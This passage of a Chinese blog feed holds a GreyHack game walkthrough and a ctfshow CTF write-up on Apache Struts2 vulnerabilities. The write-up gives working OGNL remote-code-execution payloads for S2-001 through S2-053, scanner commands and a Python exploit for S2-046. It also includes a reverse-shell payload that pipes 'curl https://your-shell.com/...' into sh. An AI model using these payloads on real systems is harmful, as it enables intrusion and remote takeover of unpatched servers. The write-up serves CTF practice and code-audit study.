            <tag> 爆破 </tag>
            
            <tag> 提权 </tag>
            
            <tag> msf </tag>
            
            <tag> MySQL </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> 日志分析 </tag>
            
            <tag> SSH公钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GreyHack</title>
      <link href="/article/grey-hack/"/>
      <url>/article/grey-hack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>仅演示单人模式</p><h1>新手期</h1><h2 id="连接WIFI"><a class="header-anchor" href="#连接WIFI">¶</a>连接WIFI</h2><p>没有给出账号密码, 而是通过手册给出了四个工具用于破解WIFI密码, 工具在Kali有对应的工具</p><p><code>airmon</code>可以用来开启网卡的监听模式, 这是获取wifi密码的第一步</p><blockquote><p>airmon -&gt; airmon-ng</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon</span><br><span class="line"><span class="comment"># wlan0      WWI109   False</span></span><br><span class="line">airmon start wlan0</span><br><span class="line"><span class="comment"># wlan0      WWI109   True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>iwlist</code>查看附近的wifi列表, iwlist wlan0即可查看wlan0能连接到的网络</p><blockquote><p>iwlist -&gt; iwlist</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwlist wlan0</span><br><span class="line"><span class="comment"># 选个好的</span></span><br><span class="line"><span class="comment"># 52:01:C6:3A:76:25  68%  Laska_NIGP</span></span><br></pre></td></tr></table></figure><p><code>aireplay</code>获取指定wifi的ACK包, 会在当前目录生成file.cap</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># aireplay -b bssid -e essid</span></span><br><span class="line">aireplay -b 52:01:C6:3A:76:25 -e Laska_NIGP</span><br></pre></td></tr></table></figure><p><code>aircrack</code>, 结合ack命令破解ack包</p><blockquote><p>aircrack -&gt; aircrack-ng</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack file.cap</span><br><span class="line"><span class="comment"># Ittend</span></span><br></pre></td></tr></table></figure><p>成功连接WIFI: <code>Laska_NIGP / Ittend</code></p><blockquote><p><code>iwconfig</code>指令连接wifi: <code>iwconfig wlan0 52:01:C6:3A:76:25 Laska_NIGP Ittend</code></p></blockquote><h2 id="注册邮箱"><a class="header-anchor" href="#注册邮箱">¶</a>注册邮箱</h2><p>用浏览器搜索mail以注册邮箱(注意避开搜索引擎的第一项)</p><p>输入账号密码即可</p><h2 id="注册银行账号"><a class="header-anchor" href="#注册银行账号">¶</a>注册银行账号</h2><p>输入bank, 随便注册一个</p><h2 id="要点"><a class="header-anchor" href="#要点">¶</a>要点</h2><p>用户空间下, config文件夹包含了邮箱和银行信息, 破解密码后可以给自己转账</p><h1>Day1</h1><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250113170916.png" alt="image.png"></p><p>让你获取指定邮箱的密码</p><p>给出了受害者的IP地址, 利用<code>whois</code>来查询IP地址的相关信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Creeper@Creeper:~$ whois 75.213.207.73</span><br><span class="line">Domain name: compuwa.org</span><br><span class="line">Administrative contact: Mabel Ersonebaumugg</span><br><span class="line">Email address: Ersonebaumugg@compuwa.org</span><br><span class="line">Phone: 544438967</span><br></pre></td></tr></table></figure><blockquote><p>我在想, 这不是受害者的IP么, whois查到的不应该是受害者的信息么? 还是说给的就是对应右键管理员的IP地址, 算了等会再说</p></blockquote><p>利用社工模板向这位管理员发送社工邮件; 我如果用全名, 他就会说这个用户不存在, 看来只需要给出邮箱名字就行了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250113173138.png" alt="image.png"></p><p>他会给我们回信, 回信内容为账号密码, 我们利用这个内容登录远程服务器, 此时会有教程跳出来, 教你隐藏踪迹</p><h2 id="工具部署"><a class="header-anchor" href="#工具部署">¶</a>工具部署</h2><p>将附件下载到<code>/bin</code>文件夹就可以直接利用命令行调用工具了</p><h2 id="远程登录"><a class="header-anchor" href="#远程登录">¶</a>远程登录</h2><blockquote><p>ssh和现实有些不同, 但是毕竟是游戏</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh Dairfa@isongo 98.4.81.231</span><br></pre></td></tr></table></figure><p>可以通过<code>FileExplorer.exe</code>启动远程的文件管理器(显示在本地)</p><h2 id="获取敏感信息"><a class="header-anchor" href="#获取敏感信息">¶</a>获取敏感信息</h2><p>Config目录下有<code>Mail.txt</code>文件, 里面是用户的邮箱账号和密码哈希值</p><p><code>Config/Bank.txt</code>是银行账号和密码哈希</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">scp -d /home/Dairfa/Config/Bank.txt</span><br><span class="line">scp -d /home/Dairfa/Config/Mail.txt</span><br><span class="line">scp -d /etc/passwd</span><br><span class="line"><span class="comment"># 哈希爆破</span></span><br><span class="line">decipher Mail.txt</span><br><span class="line">decipher Bank.txt</span><br><span class="line">decipher passwd</span><br></pre></td></tr></table></figure><p>利用给的工具爆破哈希值即可, 甚至多行还能选择爆破哪一行</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250113181036.png" alt="image.png"></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>查看<code>/etc/passwd</code>, 发现不止一个用户, 提权到root试试</p><p>利用给的工具爆破哈希值, 然后切换用户; 目的其实是拿到另一个用户的所有敏感信息, 不搞也行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure><h2 id="结尾"><a class="header-anchor" href="#结尾">¶</a>结尾</h2><p>将Dairfa用户的密码作为回信发给他, 就可以获得一个IP, 可以进行访问(是一个小商店); 后面就是做这个网站给的任务了</p><h2 id="其他"><a class="header-anchor" href="#其他">¶</a>其他</h2><p>上传ScanLan以更好地扫描网络配置</p><p>入侵完成后记得删除<code>/var/system.log</code>中操作的条目</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_java</title>
      <link href="/article/ctfshow-webbasic-java/"/>
      <url>/article/ctfshow-webbasic-java/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>java</h1><hr><blockquote><p>提示: 平台似乎有过滤, 所以提示其实是<code>echo $FLAG</code>, 直接执行这个可能就能输出flag; 但是不是很稳定, 如果不行还是使用<code>env</code></p><p>给出的payload都没有经过编码, 可能需要自己编码</p><p>说是java, 其实是struts2漏洞合集吧, 主要不是做题的, 其实是学代码审计的</p></blockquote><h2 id="web279"><a class="header-anchor" href="#web279">¶</a>web279</h2><ul><li>描述: echo FLAG</li></ul><p>只有跳转链接(戳那个where is flag), 查看源码看到提示(?)S2-001, 这是一个struts2漏洞</p><p><a href="https://www.freebuf.com/column/224041.html">Vulhub漏洞系列：struts2漏洞 S2-001</a>, <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-001/README.zh-cn.md">vulhub漏洞库_struts2</a></p><p>已经是非常详细了, 漏洞也非常的简单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line"># 很急, 找了半天找不到flag于是输出环境变量, 有了</span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><h2 id="web280"><a class="header-anchor" href="#web280">¶</a>web280</h2><ul><li>描述: echo FLAG 即可</li></ul><p>查源码, 点击跳转发现提示是S2-005</p><p>参考资料: <a href="https://zhuanlan.zhihu.com/p/701942652">Struts2-005漏洞分析(CVE-2010-1870)</a>, <a href="https://www.freebuf.com/vuls/193078.html">Struts2-005远程代码执行漏洞分析</a></p><blockquote><p>payload不好用</p></blockquote><p>拉倒了, 不如直接去下载一个现成的脚本跑</p><p><a href="https://github.com/Vancomycin-g/Struts2Scan">Struts2Scan</a>, 可以用py也可以直接打开jar文件(那是一个程序)扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u  https://7bb5c5c0-b262-40d3-8ee0-e1d47d58ed14.challenge.ctf.show/S2-005/example/HelloWorld.action</span><br><span class="line"><span class="comment"># 利用方式如下, 再输入env即可</span></span><br><span class="line">python3 .\Struts2Scan.py -u  https://7bb5c5c0-b262-40d3-8ee0-e1d47d58ed14.challenge.ctf.show/S2-005/example/HelloWorld.action -n S2-005 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240920221137757.png" alt="image-20240920221137757"></p><h2 id="web281"><a class="header-anchor" href="#web281">¶</a>web281</h2><ul><li>描述: echo FLAG</li></ul><p>点击跳转发现url提示是S2-007, 而且能提交的数据不是username和password而是name, age和email; 参数不对肯定扫不出来, 我们设置一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://208910ad-e478-4dd1-a1f8-83459a38ca57.challenge.ctf.show/S2-007/user.action -d name=1&amp;&amp;email=1&amp;&amp;age=1</span><br><span class="line"><span class="comment"># 利用如下, 同样输入env</span></span><br><span class="line">python3 .\Struts2Scan.py -u https://208910ad-e478-4dd1-a1f8-83459a38ca57.challenge.ctf.show/S2-007/user.action -n S2-016 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><p>结果扫出来是S2-016, 不是很懂反正能用就行</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921144747121.png" alt="image-20240921144747121"></p><p>然后去找了S2-007的漏洞, <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md">vulhub漏洞库_s2-007</a>, 在age处输入, 回显也在age处</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><h2 id="web282"><a class="header-anchor" href="#web282">¶</a>web282</h2><ul><li>描述: echo FLAG</li></ul><p>跳转后url提示是S2-008, 可以从<code>./cookie.jsp</code>或者<code>./devmode.jsp</code>入手</p><p>如果要获得flag, 直接用扫描工具访问并扫描这两个网址就可以了, 详细信息请看<a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md">vulhub漏洞库_s2-008</a></p><h2 id="web283"><a class="header-anchor" href="#web283">¶</a>web283</h2><ul><li>描述: Struts2 showcase远程代码执行漏洞</li></ul><p><code>CVE-2013-1965</code>?, 你不是<a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-009/README.zh-cn.md">s2-009</a>?</p><p>访问下面的url地址就能读取到env</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-009/ajax/example5?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><h2 id="web284"><a class="header-anchor" href="#web284">¶</a>web284</h2><ul><li>描述: 无</li></ul><p>提示为s2-012, 网址我就不放了, 你直接在github打开呗</p><p>payload如下, 直接塞进那个框然后抓包即可</p><blockquote><p>这何尝不是另一种脚本小子</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921153131317.png" alt="image-20240921153131317"></p><h2 id="web285"><a class="header-anchor" href="#web285">¶</a>web285</h2><ul><li>描述: 无</li></ul><p>提示s2-013; Try add some parameters in URL</p><p>s2-013poc如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-013/link.action?a=$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br></pre></td></tr></table></figure><h2 id="web286"><a class="header-anchor" href="#web286">¶</a>web286</h2><ul><li>描述: 无</li></ul><p>提示: s2-015</p><p>我尝试了可以用的payload, 但是显示env不全, FLAG没出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-015/$&#123;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream()),#q&#125;.action</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921163506207.png" alt="image-20240921163506207"></p><p>还是用工具快:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://660ecde4-19ff-49d8-8a3b-f77b26e45bbd.challenge.ctf.show/S2-015/welcome.action</span><br><span class="line"><span class="comment"># 扫出来三个, 随便用一个得了</span></span><br><span class="line">python3 .\Struts2Scan.py -u https://660ecde4-19ff-49d8-8a3b-f77b26e45bbd.challenge.ctf.show/S2-015/welcome.action -n S2-016 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><h2 id="web287"><a class="header-anchor" href="#web287">¶</a>web287</h2><ul><li>描述: 无</li></ul><p>提示: s6-016; Use “action:”, “redirect:”, “redirectAction:” in ./default.action</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-016/default.action?redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;env&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921164428208.png" alt="image-20240921164428208"></p><h2 id="web288"><a class="header-anchor" href="#web288">¶</a>web288</h2><ul><li>描述: 无</li></ul><p>提示: S2-019</p><p>复现是s2-008, 甚至poc都差不多</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27env%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</span><br></pre></td></tr></table></figure><h2 id="web289"><a class="header-anchor" href="#web289">¶</a>web289</h2><ul><li>描述: 无</li></ul><p>提示: S2-029; add “message” param in url</p><p>出问题了, 找了好几个payload用不了, 那就用工具吧</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://3e2cec0b-d431-4809-b4f9-82e49c17f631.challenge.ctf.show/S2-029/</span><br><span class="line"><span class="comment"># 利用</span></span><br><span class="line">python3 .\Struts2Scan.py -u https://3e2cec0b-d431-4809-b4f9-82e49c17f631.challenge.ctf.show/S2-029/ -n S2-045 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><h2 id="web290"><a class="header-anchor" href="#web290">¶</a>web290</h2><ul><li>描述: 无</li></ul><p>提示: s2-032</p><p>打开一个界面, 直接套用github上的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-032/memoshow.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=env </span><br></pre></td></tr></table></figure><h2 id="web291"><a class="header-anchor" href="#web291">¶</a>web291</h2><ul><li>描述: 无</li></ul><p>提示: s2-033, 其实是是<code>s2-045</code>, 或者<code>s2-037</code>, 直接搜索&quot;struts2  /orders/3&quot;就能找到</p><p>给个找到的例子, 进去直接搜索/orders/3: <a href="https://developer.aliyun.com/article/1160444">https://developer.aliyun.com/article/1160444</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-033/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</span><br></pre></td></tr></table></figure><h2 id="web292"><a class="header-anchor" href="#web292">¶</a>web292</h2><ul><li>描述: 无</li></ul><p><code>S2-037</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://837cc0c1-04ff-4c2f-bbf5-4c4b172436b6.challenge.ctf.show/S2-037/orders/3/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=env</span><br></pre></td></tr></table></figure><h2 id="web293"><a class="header-anchor" href="#web293">¶</a>web293</h2><ul><li>描述: 无</li></ul><p><code>S2-045</code>, 看github, 塞在Content-Type发出去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure><h2 id="web294"><a class="header-anchor" href="#web294">¶</a>web294</h2><ul><li>描述: 无</li></ul><p><code>S2-046</code>, <a href="https://xz.aliyun.com/t/221?time__1311=eqIx0DyGG%3DemqGKDtD%2FQnx4YuRa%2BzDcDhoD">找到的博客</a></p><p>这次漏洞的触发点在Content-Length和Content-Disposition字段的filename中, 但是你说的对, python真好用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sugarcrm</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">poctest</span>(<span class="params">self</span>):   </span><br><span class="line">        boundary=<span class="string">&quot;---------------------------735323031399963166993862150&quot;</span></span><br><span class="line">        paylaod=<span class="string">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span></span><br><span class="line">        url = <span class="string">&#x27;http://200258f8-842d-4e4b-a894-ea043fd0d046.challenge.ctf.show/S2-046/doUpload.action&#x27;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=&#x27;</span>+boundary+<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        data =<span class="string">&quot;--&quot;</span>+boundary+<span class="string">&quot;\r\nContent-Disposition: form-data; name=\&quot;foo\&quot;; filename=\&quot;&quot;</span>+paylaod+<span class="string">&quot;\0b\&quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n--&quot;</span>+boundary+<span class="string">&quot;--&quot;</span></span><br><span class="line">        rs=requests.post(url, headers=headers,data=data)</span><br><span class="line">        <span class="built_in">print</span>(rs.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test = Sugarcrm()</span><br><span class="line">    test.poctest()</span><br></pre></td></tr></table></figure><h2 id="web295"><a class="header-anchor" href="#web295">¶</a>web295</h2><ul><li>描述: 无</li></ul><p><code>S2-048</code>, 直接看github有更详细的步骤</p><p>报错界面上那个Message爆出来的number后面就是flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure><h2 id="web296"><a class="header-anchor" href="#web296">¶</a>web296</h2><ul><li>描述: 无</li></ul><p><code>s2-052</code>, 没成功, 用工具跑完了, 指令执行py文件的时候扫不出来, 但是用图形化的又可以</p><p>而且用的还是不是s2-052, 用的s2-045</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://a156802e-1b87-421a-bc6d-afff49ad14f7.challenge.ctf.show/S2-052/ -n S2-045 --exec</span><br></pre></td></tr></table></figure><h2 id="web297"><a class="header-anchor" href="#web297">¶</a>web297</h2><ul><li>描述: 无</li></ul><p><code>s2-053</code>, 详情见github相关界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;echo $FLAG&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><p>反弹shell(我没成功, 而且不知道为什么)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;curl https://your-shell.com/ip:port | sh&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><h2 id="web298"><a class="header-anchor" href="#web298">¶</a>web298</h2><ul><li>描述: 看看代码，了解下和php不一样的地方</li></ul><p><a href="https://github.com/java-decompiler/jd-gui">反编译工具</a>, 直接将war包拖进去就可以用了</p><p>从<code>web.xml</code>可以找到登录判定文件<code>logonServlet.class</code>, 再找到<code>getVipStatus</code>, 里面有账号密码:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">getVipStatus</span><span class="params">()</span> &#123;</span><br><span 